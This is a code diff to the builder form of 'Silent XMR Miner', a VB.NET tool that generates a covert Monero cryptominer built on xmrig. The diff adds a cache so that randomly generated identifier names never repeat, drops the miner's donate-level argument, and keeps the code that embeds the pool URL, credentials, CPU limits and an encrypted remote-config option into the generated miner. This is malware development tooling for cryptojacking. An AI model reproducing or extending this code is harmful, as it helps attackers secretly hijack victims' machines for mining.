@@ -8,6 +8,8 @@ Public Class Form1
     Public watchdogdata As Byte() = New Byte() {}
     Public FA As New Advanced
 
+    Public RandomiCache As New List(Of String)
+
     'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, initially based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
@@ -18,6 +20,7 @@ Public Class Form1
         Codedom.F = Me
         FA.F = Me
 
+        RandomiCache.Add("SilentXMRMiner")
 
         FA.txtAdvParam.Text = advancedParams
     End Sub
@@ -68,7 +71,7 @@ Public Class Form1
             txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
             txtLog.Text = txtLog.Text + ("Replacing strings..." + vbNewLine)
             Dim minerbuilder As New StringBuilder(My.Resources.Program)
-            Dim argstr As String = " --cinit-find-x -B " & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & If(FA.chkRemoteConfig.Checked, " --cinit-remote-config=""" & Unamlib_Encrypt(FA.txtRemoteConfig.Text) & """", "") & " --donate-level=5 "
+            Dim argstr As String = " --cinit-find-x -B " & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & If(FA.chkRemoteConfig.Checked, " --cinit-remote-config=""" & Unamlib_Encrypt(FA.txtRemoteConfig.Text) & """", "") & " "
 
             minerbuilder.Replace("#dll", Resources_dll)
             minerbuilder.Replace("#xmr", Resources_xmrig)
@@ -233,13 +236,19 @@ Public Class Form1
     End Function
 
     Public Function Randomi(ByVal length As Integer) As String
-        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
-        Dim sb As New Text.StringBuilder()
-        For i As Integer = 1 To length
-            Dim idx As Integer = rand.Next(0, Chr.Length)
-            sb.Append(Chr.Substring(idx, 1))
-        Next
-        Return sb.ToString
+        While True
+            Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
+            Dim sb As New Text.StringBuilder()
+            For i As Integer = 1 To length
+                Dim idx As Integer = rand.Next(0, Chr.Length)
+                sb.Append(Chr.Substring(idx, 1))
+            Next
+            If Not RandomiCache.Contains(sb.ToString()) Then
+                RandomiCache.Add(sb.ToString())
+                Return sb.ToString
+            End If
+        End While
+        Return ""
     End Function
 
     Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
